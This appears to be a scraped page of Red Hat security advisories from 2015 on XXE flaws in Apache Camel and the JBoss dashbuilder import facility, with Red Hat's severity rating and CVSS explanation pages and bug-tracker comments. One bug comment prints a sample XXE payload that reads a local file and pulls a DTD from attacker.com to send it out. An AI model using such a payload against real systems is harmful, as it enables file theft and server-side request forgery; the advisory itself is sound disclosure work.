RHSA-2015:1539 - Security Advisory

Issued:
2015-08-03
Updated:
2015-08-03
# RHSA-2015:1539 - Security Advisory

* [Overview](#overview)

## Synopsis

Moderate: Red Hat JBoss BPM Suite 6.1.2 update

## Type/Severity

Security Advisory: Moderate

## Topic

Red Hat JBoss BPM Suite 6.1.2, which fixes three security issues, several
bugs, and adds various enhancements, is now available from the Red Hat
Customer Portal.

Red Hat Product Security has rated this update as having Moderate security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

Red Hat JBoss BPM Suite is a business rules and processes management system
for the management, storage, creation, modification, and deployment of
JBoss rules and BPMN2-compliant business processes.

This release of Red Hat JBoss BPM Suite 6.1.2 serves as a replacement for
Red Hat JBoss BPM Suite 6.1.0, and includes bug fixes and enhancements,
which are documented in the README.txt file included with the patch files.

The following security issues are also fixed with this release:

It was found that Apache Camel's XML converter performed XML External
Entity (XXE) expansion. A remote attacker able to submit an SAXSource
containing an XXE declaration could use this flaw to read files accessible
to the user running the application server, and potentially perform other
more advanced XXE attacks. (CVE-2015-0263)

It was found that Apache Camel performed XML External Entity (XXE)
expansion when evaluating invalid XML Strings or invalid XML GenericFile
objects. A remote attacker able to submit a crafted XML message could use
this flaw to read files accessible to the user running the application
server, and potentially perform other more advanced XXE attacks.
(CVE-2015-0264)

A flaw was found in the dashbuilder import facility: the DocumentBuilders
instantiated in org.jboss.dashboard.export.ImportManagerImpl did not
disable external entities. This could allow an attacker to perform a
variety of XML External Entity (XXE) and Server-Side Request Forgery (SSRF)
attacks. (CVE-2015-1818)

Red Hat would like to thank David Jorm of IIX Product Security for
reporting the CVE-2015-1818 issue.

All users of Red Hat JBoss BPM Suite 6.1.0 as provided from the Red Hat
Customer Portal are advised to upgrade to Red Hat JBoss BPM Suite 6.1.2.

## Solution

The References section of this erratum contains a download link (you must
log in to download the update). Before applying the update, back up your
existing installation, including all applications, configuration files,
databases and database settings, and so on.

It is recommended to halt the server by stopping the JBoss Application
Server process before installing this update, and then after installing
the update, restart the server by starting the JBoss Application Server
process.

Upstream patch:  <https://git-wip-us.apache.org/repos/asf?p=camel.git;a=commitdiff;h=1df559649a96a1ca0368373387e542f46e4820da>  External References:  <https://camel.apache.org/security-advisories.data/CVE-2015-0264.txt.asc>   ```  [Comment 6](show_bug.cgi?id=1203341#c6)  errata-xmlrpc    2015-06-01 17:08:14 UTC  ``` This issue has been addressed in the following products:    JBoss Fuse/A-MQ 6.1.0  Via RHSA-2015:1041 <https://rhn.redhat.com/errata/RHSA-2015-1041.html>   ```  [Comment 7](show_bug.cgi?id=1203341#c7)  errata-xmlrpc    2015-08-03 19:41:20 UTC  ``` This issue has been addressed in the following products:    JBoss BPM Suite 6.1.2  Via RHSA-2015:1539 <https://rhn.redhat.com/errata/RHSA-2015-1539.html>   ```  [Comment 8](show_bug.cgi?id=1203341#c8)  errata-xmlrpc    2015-08-03 19:41:47 UTC  ``` This issue has been addressed in the following products:    JBoss BRMS 6.1.2  Via RHSA-2015:1538 <https://rhn.redhat.com/errata/RHSA-2015-1538.html>   ```  [Comment 9](show_bug.cgi?id=1203341#c9)  errata-xmlrpc    2015-12-07 20:51:43 UTC  ``` This issue has been addressed in the following products:    JBoss Fuse Service Works 6.2.1  Via RHSA-2015:2558 <https://rhn.redhat.com/errata/RHSA-2015-2558.html>   ``` |  |

RHSA-2015:1704 - Security Advisory

Issued:
2015-09-02
Updated:
2015-09-02
# RHSA-2015:1704 - Security Advisory

* [Overview](#overview)

## Synopsis

Moderate: Red Hat JBoss Data Virtualization 6.1.0 security update

## Type/Severity

Security Advisory: Moderate

## Topic

Red Hat JBoss Data Virtualization 6.1.0 2015 roll up patch 3, which fixes
one security issue and various bugs, is now available from the Red Hat
Customer Portal.

Red Hat Product Security has rated this update as having Moderate security
impact. A Common Vulnerability Scoring System (CVSS) base score, which
gives a detailed severity rating, is available from the CVE link in the
References section.

## Description

Red Hat JBoss Data Virtualization is a lean data integration solution that
provides easy, real-time, and unified data access across disparate sources
to multiple applications and users. JBoss Data Virtualization makes data
spread across physically distinct systems—such as multiple databases, XML
files, and even Hadoop systems—appear as a set of tables in a local
database.

This roll up patch serves as a cumulative upgrade for Red Hat JBoss Data
Virtualization 6.1.0. It includes various bug fixes, which are listed in
the README file included with the patch files.

The following security issue is also fixed with this release:

A flaw was found in the dashbuilder import facility: the DocumentBuilders
instantiated in org.jboss.dashboard.export.ImportManagerImpl did not
disable external entities. This could allow an attacker to perform a
variety of XML External Entity (XXE) and Server-Side Request Forgery (SSRF)
attacks. (CVE-2015-1818)

Red Hat would like to thank David Jorm of IIX Product Security for
reporting the CVE-2015-1818 issue.

All users of Red Hat JBoss Data Virtualization 6.1.0 as provided from the
Red Hat Customer Portal are advised to apply this roll up patch.

## Solution

The References section of this erratum contains a download link (you must
log in to download the update). Before applying the update, back up your
existing Red Hat JBoss Data Virtualization installation (including its
databases, applications, configuration files, and so on).

Note that it is recommended to halt the Red Hat JBoss Data Virtualization
server by stopping the JBoss Application Server process before installing
this update, and then after installing the update, restart the Red Hat
JBoss Data Virtualization server by starting the JBoss Application Server
process.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=1201714#c0)  Martin Prpič    2015-03-13 10:25:08 UTC  ``` A flaw was found in the dashbuilder import facility of JBoss BPMS 6: the DocumentBuilders instantiated in org.jboss.dashboard.export.ImportManagerImpl do not disable external entities.  This could allow an attacker to perform a variate of XXE/SSRF attacks. Exfiltrating data using a general entity attack is not obviously possible, but standard parameter entity exfiltration techniques will work.  For example, importing the following file:  <!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///tmp/loot.txt"> <!ENTITY % dtd SYSTEM "<http://attacker.com/send.dtd>"> %dtd; %send; ]]> <doc>bar</doc>  causes Send.dtd to be retrieved, and loot.txt to be exfiltrated if send.dtd contains the appropriate content.  Acknowledgements:  Red Hat would like to thank David Jorm of IIX Product Security for reporting this issue.   ```  [Comment 4](show_bug.cgi?id=1201714#c4)  errata-xmlrpc    2015-08-03 19:41:16 UTC  ``` This issue has been addressed in the following products:    JBoss BPM Suite 6.1.2  Via RHSA-2015:1539 <https://rhn.redhat.com/errata/RHSA-2015-1539.html>   ```  [Comment 5](show_bug.cgi?id=1201714#c5)  errata-xmlrpc    2015-09-02 16:28:20 UTC  ``` This issue has been addressed in the following products:    JBoss Data Virtualization 6.1.0  Via RHSA-2015:1704 <https://rhn.redhat.com/errata/RHSA-2015-1704.html>   ``` |  |
